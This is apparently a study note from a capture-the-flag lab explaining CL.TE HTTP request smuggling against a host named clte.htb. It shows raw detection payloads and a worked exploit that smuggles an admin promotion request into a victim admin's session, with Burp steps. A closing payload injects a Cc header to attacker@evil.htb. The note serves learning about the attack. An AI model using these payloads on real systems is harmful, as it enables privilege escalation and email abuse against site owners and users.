**Content-Lenght-Transfer-Encoding Attack**
This a type of Desync attack that happens when the front-end(reverse proxy server) doesn't understand the Transfer-Encoding header, while instead the back-end(web-server) understand the Transfer-Encoding.

## How does it work?
Basically the attacker would use both Content-length & Transfer-Encoding headers in the same request headers purposely with different sizes.
In this case the fronted will correctly parse the Content-Lenght(he doesn't support the Chunked mode), but as same time the backend(will correctly understand the TE chunked mode) and there will be a missmatch in the request causing a desync.

### CL.TE Example
In the following request you can see that **CL=10byte** but the **TE=0(hex)** bytes which is not same and will fail.
```
Fronted= I see 10bytes lenght= 0\r\n\r\nHELLO
Backend= I see 0bytes chunk lenght= 0\r\n\r\n
```

```
POST / HTTP/1.1
Host: clte.htb
Content-Length: 10
Transfer-Encoding: chunked
0
HELLO
```

### What happens next?
Is we take the previous example further and example a legit user surfs the website with:
```
GET / HTTP/1.1
Host: clte.htb
```

Front-end: I check the CL(which is indeed right) and parses the following request right
```
POST / HTTP/1.1
Host: clte.htb
Content-Length: 10
Transfer-Encoding: chunked
0
HELLO*IMMAGINARY_SEPARATOR*GET / HTTP/1.1
Host: clte.htb

```
Back-end: I check the CL=0(which is wrong) and will wrongly parse the request as you see he trunked at **/r/n0/r/n** and the HELLO which was supposed to be in the first chunk gets into chunk n2 which will give an error as "**HELLOGET**" don't exist as verb in the web-server.
```
POST / HTTP/1.1
Host: clte.htb
Content-Length: 10
Transfer-Encoding: chunked

0

HELLOGET / HTTP/1.1
Host: clte.htb
```

## How to identify for CL.TE
Use this as payload and send 2 fast requests one by another and check for behaviors response. The first request should pass as the front-end will always succeed**(CL=correct size)** and the back-end will get TE=0(wrong but still works). In the stream n2 the front-end will succeed as it used the right CL size, but the back-end will fail as will get **HELLOGET** and will likely fail 
```
GET / HTTP/1.1
Host: clte.htb
Content-Length: 10
Transfer-Encoding: chunked

0

HELLO
```


## How to exploit?
Kinda similar to previous one, example imagine you need to promote your user to admin but we can't do it by our-self with **/admin.php?promote_uid=2.** 
```
POST / HTTP/1.1
Host: clte.htb
Content-Length: 52
Transfer-Encoding: chunked

0

POST /admin.php?promote_uid=2 HTTP/1.1
Dummy: 
```


### Explanation:
The fronted will parse right the request and send it back to back-end which will truncate the request as it reads **TE=0bytes** and consequently will come the POST / request to promote our user, that the admin user will perform without even knowing.
OBS: we shipped a Dummy header as well to "hide" the first line of the admin user's request as an HTTP header value to preserve the syntax of the request's header section.

1)The admin access the page with his cookie auth
```
GET / HTTP/1.1
Host: clte.htb
Cookie: sess=<admin_session_cookie>
```
2)The fronted will send only one request to back-end
```
POST / HTTP/1.1
Host: clte.htb
Content-Length: 52
Transfer-Encoding: chunked

0 

POST /admin.php?promote_uid=2 HTTP/1.1
Dummy: GET / HTTP/1.1
Host: clte.htb
Cookie: sess=<admin_session_cookie>
```
3)Then the back-end will see this as 2 different streams caused by CL=0
```
POST / HTTP/1.1
Host: clte.htb
Content-Length: 52
Transfer-Encoding: chunked

0
*SECOND STREAM HERE*
POST /admin.php?promote_uid=2 HTTP/1.1
Dummy: GET / HTTP/1.1
Host: clte.htb
Cookie: sess=<admin_session_cookie>
```
**TIPS**:
1) Start by catching the request in burp of the base thing you want to archive, example if the Admin need to perform a GET request to the website catch that. 
2) Remove all the headers except the request and the Host
3) Add the **/r/n0/r/n**
4) Add the payload at the end, in our example a GET request to perform a promotion to the admin.
5) Send a first request so burp add the CL to the right size
6) You might need to add a Test: header into smuggled request as well to keep the responser form
6) Lastly add the Transfer-Encoding: chunked header and send the request
7) Profit!

OBS: if it's a POST request in the smuggled you might need to add the **Content-Type: application/x-www-form-urlencoded** header and the Content-Length header as well.
```
POST /contact HTTP/1.1
Host: 83.136.253.251:54607
Content-Length: 101
Content-Type: application/x-www-form-urlencoded

name=hacker%0d%0aCc:%20attacker%40evil.htb%0d%0aDummy:%20test&email=attacker%40evil.htb&message=Hello
```